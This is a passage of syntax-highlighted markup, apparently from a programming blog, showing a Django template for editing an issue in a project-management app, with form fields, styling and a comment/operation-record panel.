class="attr">href</span>=<span class="string">"&#123;% static 'plugin/bootstrap-select/css/bootstrap-select.min.css' %&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">form</span><span class="selector-id">#editForm</span> &#123;</span></span><br><span class="line">            padding-right: 20px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.comment-area</span> <span class="selector-class">.item</span> &#123;</span></span><br><span class="line">            margin-top: 20px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.comment-area</span> <span class="selector-class">.left-avatar</span> &#123;</span></span><br><span class="line">            float: left;</span><br><span class="line">            margin-right: 10px;</span><br><span class="line">            display: inline-block;</span><br><span class="line">            width: 30px;</span><br><span class="line">            height: 30px;</span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#304659</span>;</span></span><br><span class="line">            color: white;</span><br><span class="line">            text-align: center;</span><br><span class="line">            line-height: 30px;</span><br><span class="line">            border-radius: 50%;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.comment-area</span> <span class="selector-class">.right-info</span> &#123;</span></span><br><span class="line">            padding-left: 35px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.comment-area</span> <span class="selector-class">.right-info</span> <span class="selector-class">.desc</span> <span class="selector-class">.msg</span> &#123;</span></span><br><span class="line">            display: inline-block;</span><br><span class="line">            padding-right: 20px;</span><br><span class="line"><span class="css">            <span class="selector-tag">color</span>: <span class="selector-id">#8c8c8c</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.comment-area</span> <span class="selector-class">.child</span> &#123;</span></span><br><span class="line">            padding-left: 55px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.comment-area</span> <span class="selector-class">.error-msg</span> &#123;</span></span><br><span class="line">            color: red;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.comment-area</span> <span class="selector-class">.reply-user</span> &#123;</span></span><br><span class="line">            display: inline-block;</span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#ddd</span>;</span></span><br><span class="line">            color: black;</span><br><span class="line">            padding: 6px 8px;</span><br><span class="line">            margin-left: 20px;</span><br><span class="line">            border-radius: 8px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.editormd-fullscreen</span> &#123;</span></span><br><span class="line">            z-index: 1001;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container-fluid clearfix"</span> <span class="attr">style</span>=<span class="string">"padding: 20px 0;"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-7"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading edit-heading"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-edit"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 更新问题</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"editForm"</span> <span class="attr">class</span>=<span class="string">"form-horizontal"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">                        &#123;% csrf_token %&#125;</span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.issues_type.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                   <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>&#123;&#123; form.issues_type.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                                    &#123;&#123; form.issues_type &#125;&#125;</span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.subject.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                   <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>&#123;&#123; form.subject.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                                        &#123;&#123; form.subject &#125;&#125;</span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.module.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                   <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>&#123;&#123; form.module.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                                    &#123;&#123; form.module &#125;&#125;</span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.desc.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                   <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>&#123;&#123; form.desc.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"editor"</span>&gt;</span></span><br><span class="line">                                        &#123;&#123; form.desc &#125;&#125;</span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group clearfix"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6 pd-0"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.status.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                       <span class="attr">class</span>=<span class="string">"col-sm-4 control-label"</span>&gt;</span>&#123;&#123; form.status.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-8 clearfix"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                    &#123;&#123; form.status &#125;&#125;</span><br><span class="line"></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6 pd-0"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.priority.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                       <span class="attr">class</span>=<span class="string">"col-sm-4 control-label"</span>&gt;</span>&#123;&#123; form.priority.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-8 clearfix"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                    &#123;&#123; form.priority &#125;&#125;</span><br><span class="line"></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group clearfix"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6 pd-0"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.assign.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                       <span class="attr">class</span>=<span class="string">"col-sm-4 control-label"</span>&gt;</span>&#123;&#123; form.assign.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-8 clearfix"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                    &#123;&#123; form.assign &#125;&#125;</span><br><span class="line"></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6 pd-0"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.attention.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                       <span class="attr">class</span>=<span class="string">"col-sm-4 control-label"</span>&gt;</span>&#123;&#123; form.attention.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-8 clearfix"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                    &#123;&#123; form.attention &#125;&#125;</span><br><span class="line"></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group clearfix"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6 pd-0"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.start_date.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                       <span class="attr">class</span>=<span class="string">"col-sm-4 control-label"</span>&gt;</span>&#123;&#123; form.start_date.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-8 clearfix"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group"</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"input-group-addon"</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-calendar"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                        &#123;&#123; form.start_date &#125;&#125;</span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6 pd-0"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.end_date.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                       <span class="attr">class</span>=<span class="string">"col-sm-4 control-label"</span>&gt;</span>&#123;&#123; form.end_date.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-8 clearfix"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group"</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"input-group-addon"</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-calendar"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                                        &#123;&#123; form.end_date &#125;&#125;</span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group clearfix"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6 pd-0"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.mode.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                       <span class="attr">class</span>=<span class="string">"col-sm-4 control-label"</span>&gt;</span>&#123;&#123; form.mode.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-8 clearfix"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                    &#123;&#123; form.mode &#125;&#125;</span><br><span class="line"></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6 pd-0"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; form.parent.id_for_label &#125;&#125;"</span></span></span><br><span class="line"><span class="tag">                                       <span class="attr">class</span>=<span class="string">"col-sm-4 control-label"</span>&gt;</span>&#123;&#123; form.parent.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-8 clearfix"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                    &#123;&#123; form.parent &#125;&#125;</span><br><span class="line"></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-5"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-search"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 操作记录</span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body comment-area"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"comment-list"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"comment-text"</span> <span class="attr">id</span>=<span class="string">"commentText"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">"content"</span> <span class="attr">rows</span>=<span class="string">"6"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"请输入回复内容"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"btnSubmit"</span> <span class="attr">value</span>=<span class="string">"提 交"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"reply-user hide"</span> <span class="attr">id</span>=<span class="string">"replyUser"</span>&gt;</span></span><br><span class="line">                            回复 <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-times-circle"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> <span class="attr">style</span>=<span class="string">"color: #9d9d9d;"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"hide"</span> <span class="attr">id</span>=<span class="string">"recordTemplate"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left-avatar"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right-info"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"desc"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"msg"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-bullhorn"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"type"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"msg"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-user-o"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"user"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"msg"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-clock-o"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"date"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#commentText"</span> <span class="attr">class</span>=<span class="string">"reply"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-commenting-o"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 回复</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line">&#123;% block js %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 